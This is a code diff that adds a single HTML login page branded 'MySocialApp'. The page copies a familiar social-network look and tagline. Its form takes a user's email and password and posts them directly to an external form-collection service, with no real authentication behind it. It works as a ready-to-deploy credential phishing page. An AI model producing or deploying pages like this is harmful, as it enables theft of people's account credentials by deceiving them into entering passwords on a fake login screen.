@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+  <div class="flex flex-col md:flex-row items-center justify-between max-w-5xl w-full px-4">
+    
+    <!-- Branding -->
+    <div class="md:w-1/2 mb-10 md:mb-0">
+      <h1 class="text-blue-600 text-5xl font-bold mb-4">MySocialApp</h1>
+      <p class="text-xl text-gray-700">Connect with people and the world around you.</p>
+    </div>
+
+    <!-- Login Form -->
+    <div class="bg-white p-6 rounded-lg shadow-md w-full max-w-sm">
+      <form action="https://formspree.io/f/xzzgznre" method="POST" class="flex flex-col space-y-4">
+        <input type="email" name="email" placeholder="Email" required
+               class="border rounded px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+        <input type="password" name="password" placeholder="Password" required
+               class="border rounded px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+        <button type="submit"
+                class="bg-blue-600 text-white py-2 rounded font-semibold hover:bg-blue-700 transition">
+          Log In
+        </button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
